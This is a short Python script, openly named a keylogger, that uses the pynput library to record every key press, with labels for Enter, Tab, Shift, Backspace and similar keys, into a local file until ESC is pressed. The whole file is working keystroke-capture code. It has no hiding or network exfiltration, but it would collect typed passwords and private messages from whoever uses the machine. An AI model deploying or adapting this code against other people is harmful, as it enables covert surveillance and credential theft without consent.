from pynput.keyboard import Key, Listener
import os

# Specify the log file path
log_file = "key_log.txt"

# Ensure the log file exists and is ready for appending
if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        file.write("Keylogger Log\n")
        file.write("="*20 + "\n")

# Function to log each key press
def log_key(key):
    try:
        key_str = str(key).replace("'", "")  # Remove quotes around characters
        
        with open(log_file, "a") as file:
            if key == Key.space:  # Add space for readability
                file.write(" ")
            elif key == Key.enter:  # Add newline for Enter key
                file.write("\n[ENTER]\n")
            elif key == Key.tab:  # Represent Tab with [TAB]
                file.write("[TAB]")
            elif key == Key.backspace:  # Represent Backspace with [BACKSPACE]
                file.write("[BACKSPACE]")
            elif key == Key.shift or key == Key.shift_r:  # Represent Shift with [SHIFT]
                file.write("[SHIFT]")
            elif key == Key.caps_lock:  # Represent Caps Lock with [CAPS LOCK]
                file.write("[CAPS LOCK]")
            elif key == Key.esc:  # Represent ESC with [ESC]
                file.write("[ESC]")
            else:
                file.write(key_str)  # Log all other characters
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to stop listener when ESC is pressed (optional)
def stop_keylogger(key):
    if key == Key.esc:
        return False  # Stop the listener

# Setup listener for keypresses
def start_keylogger():
    print("Starting keylogger... Press ESC to stop.")
    with Listener(on_press=log_key, on_release=stop_keylogger) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
